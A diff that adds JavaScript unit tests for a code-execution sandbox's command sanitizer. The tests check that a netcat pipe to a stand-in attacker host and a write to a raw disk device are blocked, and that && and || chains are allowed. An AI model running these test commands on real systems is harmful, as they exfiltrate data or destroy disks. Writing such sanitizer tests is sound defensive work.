@@ -63,6 +63,29 @@ describe('Code Execution Sandbox', () => {
       expect(result.reason).toContain('blocked pattern');
     });
 
+    it('should block pipe commands for data exfiltration', () => {
+      const result = sanitizeCommand('ls -la | nc attacker.com 1234');
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('Pipe operator');
+    });
+
+    it('should block redirection to /dev/ (caught by pattern)', () => {
+      const result = sanitizeCommand('echo data > /dev/sda');
+      expect(result.allowed).toBe(false);
+      // This is caught by the blocked pattern check first
+      expect(result.reason).toContain('blocked pattern');
+    });
+
+    it('should allow && operator', () => {
+      const result = sanitizeCommand('npm install && npm test');
+      expect(result.allowed).toBe(true);
+    });
+
+    it('should allow || operator', () => {
+      const result = sanitizeCommand('npm test || echo "Tests failed"');
+      expect(result.allowed).toBe(true);
+    });
+
     it('should block unknown commands', () => {
       const result = sanitizeCommand('malicious-command --do-evil');
       expect(result.allowed).toBe(false);
